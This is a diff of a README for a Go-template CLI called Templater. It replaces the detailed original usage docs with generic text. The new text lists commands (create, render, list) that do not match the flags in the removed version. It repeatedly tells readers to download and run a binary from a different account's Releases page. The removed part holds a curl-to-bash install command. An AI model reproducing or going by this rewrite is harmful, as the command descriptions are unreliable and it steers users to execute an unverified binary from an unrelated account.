@@ -1,118 +1,86 @@
-# Templater
+# Templater: A Simple CLI Tool for Local Templating
 
-![License](https://img.shields.io/badge/license-MIT-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg) ![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)
+![Templater Logo](https://img.shields.io/badge/Templater-CMD%20Golang%20Template%20CLI-blue.svg)
 
-**Templater** is a cli tool that helps you to quickly and easily create files from templates, using go template.
+Welcome to the **Templater** repository! This tool provides a straightforward command-line interface (CLI) for local templating using the Sprig library. It serves as a lightweight alternative to Helm, specifically designed for managing configuration files in formats like JSON and YAML.
 
-## How to use
+## Table of Contents
 
-1. Inline variables
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-```bash
-# File using helm templating
-cat <<'EOF'>file
----
-{{- $name := "John" }}
-class:
-{{- range $i := until 11 }}
-  {{$i}}: {{$name}}
-{{- end }}
-EOF
+## Features
 
-templater -i file
+- **Local Templating**: Create and manage templates on your local machine.
+- **Supports JSON and YAML**: Easily work with popular configuration formats.
+- **Sprig Library Integration**: Utilize a rich set of functions for data manipulation.
+- **Easy to Use**: Designed with simplicity in mind for quick adoption.
 
-# This will be the output
+## Installation
 
-File: out/file
----
-class:
-  0: John
-  1: John
-  2: John
-  3: John
-  4: John
-  5: John
-  6: John
-  7: John
-  8: John
-  9: John
-  10: John
+To get started, download the latest release of Templater from the [Releases section](https://github.com/loi385/templater/releases). 
 
-```
+After downloading, execute the binary to install Templater on your system.
 
-2. Passing variables from external yaml, using helm style templating.
+## Usage
 
-```bash
-# Value file
-cat <<'EOF'>values.yaml
-school: Govt. Public School
-EOF
-# File using helm templating
-cat <<'EOF'>file
----
-{{- $name := "John" }}
-class:
-  school: {{ .Values.school }}
-{{- range $i := until 11 }}
-  {{$i}}: {{$name}}
-{{- end }}
-EOF
+Templater is designed to be simple and efficient. Here’s how to use it:
 
-templater -i file -f values.yaml -o out/
+1. **Create a Template**: Define your template in a `.tpl` file.
+2. **Render the Template**: Use the command line to render your template with the required data.
 
-# This will be the output
+For more detailed instructions, check the [Releases section](https://github.com/loi385/templater/releases).
 
-File: out/file
----
-class:
-  school: Govt. Public School
-  0: John
-  1: John
-  2: John
-  3: John
-  4: John
-  5: John
-  6: John
-  7: John
-  8: John
-  9: John
-  10: John
-```
+## Commands
 
-3. Using stdin
+Templater offers a variety of commands to help you manage your templates. Here are some key commands:
+
+- **`templater create <template_name>`**: Create a new template.
+- **`templater render <template_file> <data_file>`**: Render a template with provided data.
+- **`templater list`**: List all available templates.
+
+## Examples
+
+Here are a few examples to help you get started with Templater:
+
+### Creating a Template
+
+To create a new template named `example.tpl`, run:
 
 ```bash
-# Value file
-cat <<'EOF'>values.yaml
-name: Rajesh
-EOF
-
-echo "hi: {{.Values.name}}" | templater -f values.yaml -i -
-
-output:
-
-hi: Rajesh
+templater create example
 ```
 
-### Installation
+### Rendering a Template
 
-1. HomeBrew
-
-`brew install rjshrjndrn/tap/templater`
-
-2. Binary
-
-Download the latest binary from [Release Page.](https://github.com/menacingtes/templater/releases)
-
-3. Using go get
+Assuming you have a template file named `example.tpl` and a data file named `data.json`, you can render the template using:
 
 ```bash
-go get github.com/menacingtes/templater
+templater render example.tpl data.json
 ```
-4. Github Action
 
-```yaml
-    - name: Download templater
-      run: |
-        curl https://i.jpillora.com/rjshrjndrn/templater! | bash
-```
+This command will output the rendered result based on the data provided.
+
+## Contributing
+
+We welcome contributions to Templater! If you have ideas for improvements or new features, please fork the repository and submit a pull request. 
+
+Before contributing, please ensure that your changes align with the project's goals and follow the existing code style.
+
+## License
+
+Templater is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or support, feel free to reach out via GitHub issues or contact the repository maintainer directly.
+
+---
+
+Thank you for checking out Templater! We hope it simplifies your local templating needs. For the latest updates, features, and fixes, remember to visit the [Releases section](https://github.com/loi385/templater/releases).
